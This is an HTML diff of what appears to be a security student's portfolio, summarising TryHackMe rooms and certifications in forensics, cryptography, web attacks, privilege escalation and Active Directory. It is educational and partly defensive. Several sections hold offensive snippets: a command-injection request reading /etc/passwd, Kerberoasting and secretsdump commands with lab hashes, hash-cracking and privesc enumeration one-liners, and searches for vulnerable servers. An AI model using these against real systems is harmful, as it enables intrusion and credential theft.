+    <span class="wmodal-section-label">▸ Core Plugin Cheatsheet</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>volatility 3</span></div>
+      <pre><span class="cmd">python3 vol.py -f dump.raw windows.info</span>        <span class="cmt"># OS profile</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.pstree</span>      <span class="cmt"># process tree</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.malfind</span>     <span class="cmt"># injected code</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.netstat</span>     <span class="cmt"># network connections</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.hashdump</span>    <span class="cmt"># NTLM hashes</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.filescan</span>    <span class="cmt"># file handles in memory</span>
+<span class="cmd">python3 vol.py -f dump.raw windows.cmdline</span>     <span class="cmt"># process command lines</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All questions answered</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-crypt">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// TRYHACKME ROOM · CRYPTOGRAPHY</div>
+    <h2 class="wmodal-title">🔐 Crypto101</h2>
+    <p class="wmodal-subtitle">Foundational cryptography concepts applied in a security context — symmetric vs asymmetric encryption, hashing, digital signatures, and common cipher attacks.</p>
+    <div class="wmodal-tags"><span class="tag">AES</span><span class="tag">RSA</span><span class="tag">XOR</span><span class="tag">Hashing</span><span class="tag">Digital Signatures</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What I Learned</span>
+    <ul>
+      <li><strong>Symmetric encryption</strong> — AES block cipher modes (ECB vs CBC), why ECB leaks patterns (penguin attack), IV importance in CBC.</li>
+      <li><strong>Asymmetric encryption</strong> — RSA key pairs, how public/private keys relate, practical key sizes, TLS handshake flow.</li>
+      <li><strong>Hashing fundamentals</strong> — MD5, SHA-1, SHA-256 properties, rainbow tables, salting, why length-extension attacks exist.</li>
+      <li><strong>XOR cipher weaknesses</strong> — key reuse attacks, frequency analysis, known-plaintext recovery.</li>
+      <li><strong>Digital signatures</strong> — signing with private key, verifying with public key, certificate chains and PKI.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Key Concepts Applied</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>python3 examples</span></div>
+      <pre><span class="cmt"># XOR key reuse attack (crib-dragging)</span>
+<span class="cmd">ct1_xor_ct2 = bytes(a ^ b for a,b in zip(ct1, ct2))</span>
+<span class="cmt"># Hash cracking with hashcat</span>
+<span class="cmd">hashcat -m 0  hash.txt rockyou.txt</span>   <span class="cmt"># MD5</span>
+<span class="cmd">hashcat -m 100 hash.txt rockyou.txt</span>  <span class="cmt"># SHA-1</span>
+<span class="cmt"># RSA small exponent — if e=3 and m is small, m = cbrt(c)</span>
+<span class="cmd">import gmpy2; m = gmpy2.iroot(c, 3)[0]</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All challenges solved</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-owasp">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// TRYHACKME ROOM · WEB SECURITY</div>
+    <h2 class="wmodal-title">🌐 OWASP Top 10</h2>
+    <p class="wmodal-subtitle">Practical exploitation of each of the OWASP Top 10 vulnerabilities against intentionally vulnerable web applications. Covered injection, broken auth, SSRF, XXE, and more.</p>
+    <div class="wmodal-tags"><span class="tag">SQLi</span><span class="tag">XSS</span><span class="tag">SSRF</span><span class="tag">XXE</span><span class="tag">IDOR</span><span class="tag">Broken Auth</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Vulnerabilities Practiced</span>
+    <ul>
+      <li><strong>A01 — Injection (SQLi):</strong> UNION-based and blind boolean SQLi to extract database contents and bypass login.</li>
+      <li><strong>A02 — Broken Authentication:</strong> Username enumeration via timing differences, weak session token prediction.</li>
+      <li><strong>A03 — Sensitive Data Exposure:</strong> Extracting credentials from unencrypted SQLite databases left accessible.</li>
+      <li><strong>A04 — XXE:</strong> XML external entity injection to read <code>/etc/passwd</code> and probe internal services.</li>
+      <li><strong>A05 — Broken Access Control (IDOR):</strong> Manipulating user ID parameters to access other accounts' data.</li>
+      <li><strong>A08 — Insecure Deserialization:</strong> Exploiting Python pickle deserialization for remote code execution.</li>
+      <li><strong>A10 — SSRF:</strong> Forcing the server to make internal requests, accessing cloud metadata endpoints.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Notable Exploit — Command Injection</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>HTTP request</span></div>
+      <pre><span class="cmd">GET /ping?ip=127.0.0.1;cat+/etc/passwd HTTP/1.1</span>
+<span class="hi">→ root:x:0:0:root:/root:/bin/bash</span>
+<span class="cmt"># Operator chaining: ;  |  ||  &amp;&amp;  `cmd`  $(cmd)</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All 10 vulnerability tasks done</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-osint">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// TRYHACKME ROOM · OPEN-SOURCE INTELLIGENCE</div>
+    <h2 class="wmodal-title">🕵️ OSINT</h2>
+    <p class="wmodal-subtitle">Hands-on open-source intelligence gathering — using public sources, metadata, reverse image search, DNS records, and social engineering foundations to profile targets.</p>
+    <div class="wmodal-tags"><span class="tag">OSINT</span><span class="tag">Maltego</span><span class="tag">Shodan</span><span class="tag">DNS</span><span class="tag">Metadata</span><span class="tag">Google Dorking</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What I Learned</span>
+    <ul>
+      <li><strong>Google Dorking</strong> — operators like <code>site:</code>, <code>filetype:</code>, <code>intitle:</code>, <code>inurl:</code> to surface sensitive exposed files and login pages.</li>
+      <li><strong>Shodan</strong> — querying internet-facing devices by port, banner, org, and vulnerability tag to map attack surface.</li>
+      <li><strong>DNS enumeration</strong> — <code>dig</code>, <code>nslookup</code>, <code>dnsx</code> for zone transfers, subdomain brute-forcing, SPF/DMARC misconfiguration analysis.</li>
+      <li><strong>Image metadata (EXIF)</strong> — extracting GPS coordinates, device info, and timestamps from photos using <code>exiftool</code>.</li>
+      <li><strong>Email OSINT</strong> — hunter.io, LinkedIn enumeration, breach database lookups via HaveIBeenPwned.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Useful Commands</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali@forensics:~</span></div>
+      <pre><span class="cmd">exiftool photo.jpg</span>                         <span class="cmt"># extract metadata</span>
+<span class="cmd">dig axfr @ns1.target.com target.com</span>        <span class="cmt"># zone transfer attempt</span>
+<span class="cmd">theHarvester -d target.com -b all</span>          <span class="cmt"># email/subdomain harvest</span>
+<span class="cmd">shodan search "apache 2.4.49 200"</span>          <span class="cmt"># vulnerable server search</span>
+<span class="cmt"># Google dork examples</span>
+<span class="warn">site:target.com filetype:pdf</span>
+<span class="warn">intitle:"index of" site:target.com</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All intelligence tasks finished</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-lpe">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// TRYHACKME ROOM · PRIVILEGE ESCALATION</div>
+    <h2 class="wmodal-title">🐧 Linux Privilege Escalation</h2>
+    <p class="wmodal-subtitle">Systematic enumeration and exploitation of Linux privilege escalation vectors — from SUID binaries and cron jobs to sudo misconfigurations and writable passwd files.</p>
+    <div class="wmodal-tags"><span class="tag">Linux</span><span class="tag">SUID</span><span class="tag">sudo</span><span class="tag">Cron</span><span class="tag">GTFOBins</span><span class="tag">Privesc</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Escalation Vectors Covered</span>
+    <ul>
+      <li><strong>sudo -l misconfigurations</strong> — abusing NOPASSWD entries with GTFOBins (vim, find, python, awk all provide shell escapes).</li>
+      <li><strong>SUID binaries</strong> — finding SUID files with <code>find / -perm -4000</code>, exploiting unusual SUID binaries via GTFOBins.</li>
+      <li><strong>Cron job hijacking</strong> — writable scripts executed as root by crontab; replacing with reverse shell payload.</li>
+      <li><strong>Capabilities</strong> — <code>getcap -r / 2>/dev/null</code> to find binaries with elevated kernel capabilities (python3 + cap_setuid).</li>
+      <li><strong>PATH hijacking</strong> — placing a malicious binary early in PATH to intercept calls from SUID programs.</li>
+      <li><strong>NFS no_root_squash</strong> — creating SUID shell on NFS share to escalate when mounted on target.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Enumeration One-Liners</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>bash</span></div>
+      <pre><span class="cmd">sudo -l</span>                                                 <span class="cmt"># sudo rights</span>
+<span class="cmd">find / -perm -4000 -type f 2>/dev/null</span>                 <span class="cmt"># SUID files</span>
+<span class="cmd">getcap -r / 2>/dev/null</span>                                 <span class="cmt"># capabilities</span>
+<span class="cmd">cat /etc/crontab ; ls -la /etc/cron*</span>                   <span class="cmt"># cron jobs</span>
+<span class="cmd">find / -writable -type f 2>/dev/null | grep -v proc</span>    <span class="cmt"># writable files</span>
+<span class="cmd">cat /etc/passwd | grep -v nologin | grep -v false</span>      <span class="cmt"># login users</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · root shell achieved via 6 different methods</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-ad">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// TRYHACKME ROOM · ACTIVE DIRECTORY PENTESTING</div>
+    <h2 class="wmodal-title">🏰 Active Directory Basics</h2>
+    <p class="wmodal-subtitle">End-to-end Active Directory penetration testing — from initial enumeration and user harvesting through to Kerberos attacks, lateral movement, and domain dominance.</p>
+    <div class="wmodal-tags"><span class="tag">Active Directory</span><span class="tag">Kerberos</span><span class="tag">BloodHound</span><span class="tag">impacket</span><span class="tag">DCSync</span><span class="tag">Pass-the-Hash</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Attack Phases Covered</span>
+    <ul>
+      <li><strong>Enumeration</strong> — <code>enum4linux</code>, <code>ldapdomaindump</code>, CrackMapExec for users, groups, shares, and password policy.</li>
+      <li><strong>Password spraying</strong> — low-and-slow spraying with CrackMapExec against Kerberos (no lockout trigger) to find valid creds.</li>
+      <li><strong>BloodHound / SharpHound</strong> — graph-based attack path analysis to identify shortest route to Domain Admin.</li>
+      <li><strong>Kerberoasting (T1558.003)</strong> — requesting TGS for SPNs, cracking RC4-encrypted tickets offline.</li>
+      <li><strong>Pass-the-Hash</strong> — using NTLM hashes directly without cracking via <code>pth-winexe</code> and CrackMapExec.</li>
+      <li><strong>DCSync (T1003.006)</strong> — replicating domain secrets with <code>secretsdump.py</code>, obtaining krbtgt for Golden Ticket persistence.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Attack Chain Summary</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>impacket suite</span></div>
+      <pre><span class="cmd">GetUserSPNs.py domain/user:pass -dc-ip DC -request -outputfile spns.txt</span>
+<span class="cmd">hashcat -m 13100 spns.txt rockyou.txt</span>
+<span class="hi">→ svc-admin : management2005</span>
+<span class="cmd">secretsdump.py domain/svc-admin:management2005@DC</span>
+<span class="hi">→ Administrator NTLM : 0e0363213e37b94221497260b0bcb4fc</span>
+<span class="hi">→ krbtgt NTLM        : 8fbf5eec4d06f15ee76a456a4e197b13</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · Full domain compromise achieved</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-mal">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// TRYHACKME ROOM · REVERSE ENGINEERING</div>
+    <h2 class="wmodal-title">🦠 Malware Analysis</h2>
+    <p class="wmodal-subtitle">Static and dynamic malware analysis techniques — from safe sandboxing and string extraction to behavioural analysis with Process Monitor and network traffic inspection.</p>
+    <div class="wmodal-tags"><span class="tag">Static Analysis</span><span class="tag">Dynamic Analysis</span><span class="tag">Ghidra</span><span class="tag">PEStudio</span><span class="tag">Sandbox</span><span class="tag">YARA</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Analysis Methodology</span>
+    <ul>
+      <li><strong>Static analysis</strong> — <code>file</code>, <code>strings</code>, <code>exiftool</code>, PEStudio for PE headers, imports, exports, and entropy analysis to detect packing.</li>
+      <li><strong>Hashing &amp; VirusTotal</strong> — MD5/SHA256 fingerprinting, VT API lookups, YARA rule matching against known families.</li>
+      <li><strong>Ghidra disassembly</strong> — function analysis, identifying anti-analysis techniques (sleep calls, GetTickCount), decoding XOR-obfuscated strings.</li>
+      <li><strong>Dynamic analysis (sandbox)</strong> — Process Monitor filters for file/registry writes, Wireshark for C2 callbacks, Process Hacker for injected threads.</li>
+      <li><strong>YARA rule writing</strong> — creating detection signatures from unique byte sequences and string patterns found during static analysis.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Analysis Workflow</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>kali / flare-vm</span></div>
+      <pre><span class="cmd">file malware.exe</span>        <span class="hi">→ PE32+ executable, UPX packed</span>
+<span class="cmd">upx -d malware.exe</span>      <span class="hi">→ unpacked to malware_unpacked.exe</span>
+<span class="cmd">strings malware_unpacked.exe | grep -E "http|\.exe|cmd"</span>
+<span class="hi">→ http://185.220.x.x/gate.php</span>
+<span class="hi">→ C:\Users\Public\svcupdate.exe</span>
+<span class="cmd">sha256sum malware.exe</span>
+<span class="warn">→ Submit to VirusTotal: 47/72 detections — Trojan.AgentTesla</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · Malware family identified, YARA rule written</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-ws">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// TRYHACKME ROOM · NETWORK FORENSICS</div>
+    <h2 class="wmodal-title">📡 Wireshark: The Basics</h2>
+    <p class="wmodal-subtitle">Deep-dive into Wireshark for network forensics — capture filters, display filters, protocol dissection, stream following, and extracting files from packet captures.</p>
+    <div class="wmodal-tags"><span class="tag">Wireshark</span><span class="tag">PCAP</span><span class="tag">tshark</span><span class="tag">HTTP</span><span class="tag">DNS</span><span class="tag">Network Forensics</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What I Learned</span>
+    <ul>
+      <li><strong>Capture vs display filters</strong> — BPF syntax for capture filters (<code>port 80</code>, <code>host x.x.x.x</code>) vs Wireshark display filter syntax (<code>http.request.method == "POST"</code>).</li>
+      <li><strong>Protocol dissection</strong> — drilling into DNS queries, HTTP sessions, SMB handshakes, and TLS certificate inspection.</li>
+      <li><strong>Following streams</strong> — TCP, UDP, HTTP stream reconstruction to read cleartext communication and spot data exfiltration.</li>
+      <li><strong>Exporting objects</strong> — File → Export Objects → HTTP to extract transferred executables, documents, and images from the PCAP.</li>
+      <li><strong>Statistics tools</strong> — Protocol Hierarchy, Conversations, Endpoints, and I/O graph for rapid triage of large captures.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Useful Filters</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>Wireshark display filters</span></div>
+      <pre><span class="cmd">http.request.method == "POST"</span>           <span class="cmt"># POST requests</span>
+<span class="cmd">dns.qry.name contains "evil"</span>             <span class="cmt"># suspicious DNS</span>
+<span class="cmd">tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</span><span class="cmt"># SYN scan detection</span>
+<span class="cmd">frame contains "password"</span>               <span class="cmt"># credential search</span>
+<span class="cmd">ip.src == 192.168.1.x &amp;&amp; http</span>           <span class="cmt"># host HTTP traffic</span>
+<span class="cmd">!(arp || dns || icmp)</span>                   <span class="cmt"># remove noise</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · All PCAP challenges solved</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-jrpt">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// TRYHACKME LEARNING PATH · 64 HOURS</div>
+    <h2 class="wmodal-title">🔎 Jr Penetration Tester</h2>
+    <p class="wmodal-subtitle">TryHackMe's flagship 64-hour learning path covering the complete penetration testing methodology — from reconnaissance and web exploitation to network pivoting and report writing.</p>
+    <div class="wmodal-tags"><span class="tag">Learning Path</span><span class="tag">Pentesting</span><span class="tag">Web App</span><span class="tag">Network</span><span class="tag">Privesc</span><span class="tag">Reporting</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Modules Completed</span>
+    <ul>
+      <li><strong>Pentesting Fundamentals</strong> — engagement types, scoping, rules of engagement, legal frameworks, PTES methodology.</li>
+      <li><strong>Reconnaissance (Passive &amp; Active)</strong> — OSINT, DNS enumeration, Nmap scanning strategies, service fingerprinting.</li>
+      <li><strong>Web Application Pentesting</strong> — Burp Suite proxy, SQLi, XSS, command injection, directory traversal, IDOR, authentication bypass.</li>
+      <li><strong>Vulnerability Exploitation</strong> — CVE research, Metasploit framework, manual exploitation, exploit-db usage.</li>
+      <li><strong>Privilege Escalation</strong> — Linux (SUID, cron, capabilities) and Windows (token impersonation, registry, service misconfigs).</li>
+      <li><strong>Post-Exploitation &amp; Pivoting</strong> — Meterpreter, tunnelling, port forwarding, lateral movement techniques.</li>
+      <li><strong>Report Writing</strong> — executive summary, CVSS scoring, remediation recommendations, proof-of-concept documentation.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <div class="winfo-box">This learning path acted as a structured foundation for the CEH certification, bridging theoretical knowledge with hands-on exploitation labs across 40+ rooms.</div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Path Status</span><span class="wflag-val">Completed · Certificate of Completion issued</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-soc">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// TRYHACKME LEARNING PATH · SOC ANALYSIS</div>
+    <h2 class="wmodal-title">🧩 SOC Level 1</h2>
+    <p class="wmodal-subtitle">Blue team training for Tier 1 SOC analysts — alert triage, SIEM querying, threat intelligence lookups, phishing analysis, network traffic detection, and incident escalation.</p>
+    <div class="wmodal-tags"><span class="tag">SOC</span><span class="tag">SIEM</span><span class="tag">Splunk</span><span class="tag">Alert Triage</span><span class="tag">Threat Intel</span><span class="tag">Blue Team</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Skills Developed</span>
+    <ul>
+      <li><strong>SIEM fundamentals</strong> — Splunk SPL queries for log correlation, building detection rules, dashboard creation for security monitoring.</li>
+      <li><strong>Alert triage workflow</strong> — true positive vs false positive classification, enrichment with threat intel (VirusTotal, AbuseIPDB, Shodan).</li>
+      <li><strong>Phishing analysis</strong> — email header analysis (SPF/DKIM/DMARC), URL defanging, attachment sandboxing, IOC extraction.</li>
+      <li><strong>Endpoint detection</strong> — interpreting Windows event IDs (4624, 4625, 4688, 4698, 4720), Sysmon event analysis.</li>
+      <li><strong>Network IDS/IPS</strong> — Snort/Suricata rule syntax, alert interpretation, signature tuning to reduce false positives.</li>
+      <li><strong>Incident escalation</strong> — when to escalate to Tier 2, documenting evidence, maintaining chain of custody.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Key Splunk Queries</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>Splunk SPL</span></div>
+      <pre><span class="cmd">index=windows EventCode=4625 | stats count by src_ip | sort -count</span>
+<span class="hi">→ Brute-force detection by source IP</span>
+<span class="cmd">index=windows EventCode=4688 NewProcessName="*powershell*" | table _time, ComputerName, CommandLine</span>
+<span class="hi">→ PowerShell execution monitoring</span>
+<span class="cmd">index=network dest_port=4444 OR dest_port=1337 | stats count by src_ip dest_ip</span>
+<span class="hi">→ Common C2 port detection</span></pre>
+    </div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Path Status</span><span class="wflag-val">Completed · SOC Level 1 Certificate issued</span></div></div>
+  </div>
+</template>
+
+<template id="wp-rm-ir">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// TRYHACKME ROOM · DFIR</div>
+    <h2 class="wmodal-title">⚡ Incident Response</h2>
+    <p class="wmodal-subtitle">End-to-end incident response simulation — from initial detection and containment through evidence preservation, forensic analysis, eradication, and post-incident reporting following the NIST IR framework.</p>
+    <div class="wmodal-tags"><span class="tag">DFIR</span><span class="tag">NIST</span><span class="tag">Evidence Preservation</span><span class="tag">Containment</span><span class="tag">Eradication</span><span class="tag">Reporting</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ IR Lifecycle — NIST SP 800-61</span>
+    <ul>
+      <li><strong>1. Preparation</strong> — IR plan, runbook creation, tooling setup (KAPE, FTK Imager, Velociraptor), communication matrix.</li>
+      <li><strong>2. Detection &amp; Analysis</strong> — alert triage from SIEM, log correlation, IOC enrichment, scope determination (affected systems, lateral movement paths).</li>
+      <li><strong>3. Containment</strong> — short-term (network isolation, account disable) vs long-term (patch, reimaging strategy), evidence preservation before containment.</li>
+      <li><strong>4. Eradication</strong> — removing persistence mechanisms, cleaning registry keys, scheduled tasks, dropped binaries, and C2 implants.</li>
+      <li><strong>5. Recovery</strong> — restoring from known-good backups, monitoring for re-infection, phased reconnection to network.</li>
+      <li><strong>6. Post-Incident Activity</strong> — lessons-learned meeting, IR report with timeline, root cause analysis, and security control improvements.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Evidence Collection with KAPE</span>
+    <div class="wcode">
+      <div class="wcode-header"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>KAPE triage collection</span></div>
+      <pre><span class="cmd">kape.exe --tsource C: --tdest D:\Evidence --target !SANS_Triage</span>
+<span class="hi">→ Collects: Event logs, registry hives, prefetch, LNK files,</span>
+<span class="hi">  browser history, $MFT, scheduled tasks, startup items</span>
+<span class="cmd">kape.exe --msource D:\Evidence --mdest D:\Processed --module !EZParser</span>
+<span class="hi">→ Parses all artefacts into CSV/JSON for timeline analysis</span></pre>
+    </div>
+    <div class="winfo-box warn">Key IR principle: Always preserve evidence BEFORE containment when possible. Pulling the network cable destroys volatile memory (running processes, network connections, open file handles).</div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Room Status</span><span class="wflag-val">Completed · Full IR report submitted</span></div></div>
+  </div>
+</template>
+
+<template id="wp-cert-ceh">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow medium">// EC-COUNCIL · IN PROGRESS</div>
+    <h2 class="wmodal-title">🎖️ Certified Ethical Hacker (CEH v12)</h2>
+    <p class="wmodal-subtitle">The industry-standard credential for offensive security, covering the full attacker lifecycle — from reconnaissance through covering tracks — mapped to real-world tooling and methodology.</p>
+    <div class="wmodal-tags"><span class="tag">Networking</span><span class="tag">Recon</span><span class="tag">Scanning</span><span class="tag">Enumeration</span><span class="tag">System Hacking</span><span class="tag">Malware</span><span class="tag">Web App Attacks</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Domains Being Covered</span>
+    <ul>
+      <li><strong>Networking Fundamentals</strong> — OSI/TCP-IP internals, routing and switching concepts as a foundation for every later attack technique.</li>
+      <li><strong>Reconnaissance &amp; Footprinting</strong> — passive and active recon, OSINT, DNS/WHOIS enumeration.</li>
+      <li><strong>Scanning &amp; Enumeration</strong> — Nmap scan types, service/version detection, SNMP, SMB, and LDAP enumeration.</li>
+      <li><strong>Vulnerability Assessment</strong> — scoring with CVSS, mapping findings to CVEs.</li>
+      <li><strong>System Hacking</strong> — password attacks, privilege escalation, reverse shells, Metasploit, steganography, and covering tracks.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ How I'm Studying</span>
+    <div class="winfo-box">Working through the CEH roadmap module by module — Python and Bash fundamentals alongside the theory, so every concept gets tied to a working script rather than staying abstract. Practice exams are used to find and close specific gaps as they come up.</div>
+    <div class="wflag"><span class="wflag-icon">📚</span><div><span class="wflag-label">Certification Status</span><span class="wflag-val">In Progress · EC-Council</span></div></div>
+  </div>
+</template>
+
+<template id="wp-cert-chfi">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow hard">// EC-COUNCIL · IN PROGRESS</div>
+    <h2 class="wmodal-title">🔬 Computer Hacking Forensic Investigator (CHFI)</h2>
+    <p class="wmodal-subtitle">A digital forensics and incident response credential covering the full investigative lifecycle — acquisition, preservation, and analysis of digital evidence across operating systems, networks, and cloud environments.</p>
+    <div class="wmodal-tags"><span class="tag">DFIR</span><span class="tag">Disk Forensics</span><span class="tag">Network Forensics</span><span class="tag">Malware Forensics</span><span class="tag">Cloud DFIR</span><span class="tag">Anti-Forensics</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Domains Being Covered</span>
+    <ul>
+      <li><strong>Forensic Fundamentals</strong> — chain of custody, forensic readiness, legal considerations.</li>
+      <li><strong>Data Acquisition &amp; Anti-Forensics</strong> — disk imaging, hashing for integrity, detecting anti-forensic techniques.</li>
+      <li><strong>OS Forensics</strong> — Windows, Linux, and macOS artefact analysis.</li>
+      <li><strong>Network &amp; Cloud Forensics</strong> — packet capture analysis, log correlation, cloud provider evidence sources.</li>
+      <li><strong>Mobile, IoT &amp; Malware Forensics</strong> — extraction techniques and static/dynamic malware triage.</li>
+      <li><strong>Incident Response</strong> — mapping findings to the MITRE ATT&amp;CK framework, SIEM/EDR-driven investigation.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Foundation Already Built</span>
+    <div class="winfo-box">Studied digital forensics across 19 modules before starting formal CHFI prep — fundamentals, disk/file system analysis, data acquisition, anti-forensics, Windows/Linux/Mac forensics, network forensics, database, cloud, email, mobile, IoT and malware forensics, incident response, MITRE ATT&amp;CK, and advanced SIEM/EDR/Cloud DFIR.</div>
+    <div class="wflag"><span class="wflag-icon">📚</span><div><span class="wflag-label">Certification Status</span><span class="wflag-val">In Progress · EC-Council</span></div></div>
+  </div>
+</template>
+
+<template id="wp-cert-nvhdf">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// NEWVERSIONHACKER · COMPLETED · GRADE A+</div>
+    <h2 class="wmodal-title">🎓 NVH Digital Forensic</h2>
+    <p class="wmodal-subtitle">A 3-month structured digital forensics program, completed with a Grade A+, covering practical evidence handling and investigation methodology from intake to report.</p>
+    <div class="wmodal-tags"><span class="tag">Digital Forensics</span><span class="tag">Evidence Handling</span><span class="tag">Chain of Custody</span><span class="tag">Reporting</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ Programme Details</span>
+    <ul>
+      <li><strong>Duration</strong> — 3-month structured program.</li>
+      <li><strong>Result</strong> — Grade A+.</li>
+      <li><strong>Issued</strong> — 8 June 2026 · Valid till 9 June 2028.</li>
+      <li><strong>Certificate Number</strong> — CN-NVHDF26B07002AB.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
+    <div class="winfo-box">Covered forensically sound evidence acquisition, preservation, and chain-of-custody practices, applied through hands-on investigation exercises rather than theory alone.</div>
+    <div class="wflag"><span class="wflag-icon">🏆</span><div><span class="wflag-label">Credential Status</span><span class="wflag-val">Completed · Grade A+ · Certificate available below</span></div></div>
+  </div>
+</template>
+
+<template id="wp-cert-eh101">
+  <div class="writeup-page">
+    <div class="wmodal-eyebrow easy">// FOUNDATIONAL COURSE · COMPLETED</div>
+    <h2 class="wmodal-title">🔰 Ethical Hacking 101: Beginners Guide</h2>
+    <p class="wmodal-subtitle">A foundational ethical hacking course covering the core mindset, terminology, and methodology that every later certification and hands-on lab builds on.</p>
+    <div class="wmodal-tags"><span class="tag">Fundamentals</span><span class="tag">Ethics &amp; Legality</span><span class="tag">Attack Lifecycle</span></div>
+    <div class="wmodal-divider"></div>
+    <span class="wmodal-section-label">▸ What It Covered</span>
+    <ul>
+      <li><strong>Ethical Hacking Fundamentals</strong> — the difference between white/grey/black hat activity, legal boundaries, and engagement scoping.</li>
+      <li><strong>The Attack Lifecycle</strong> — reconnaissance, scanning, gaining access, maintaining access, and covering tracks, at an introductory level.</li>
+      <li><strong>Foundational Terminology</strong> — the shared vocabulary used across every deeper certification that followed.</li>
+    </ul>
+    <div class="wmodal-divider"></div>
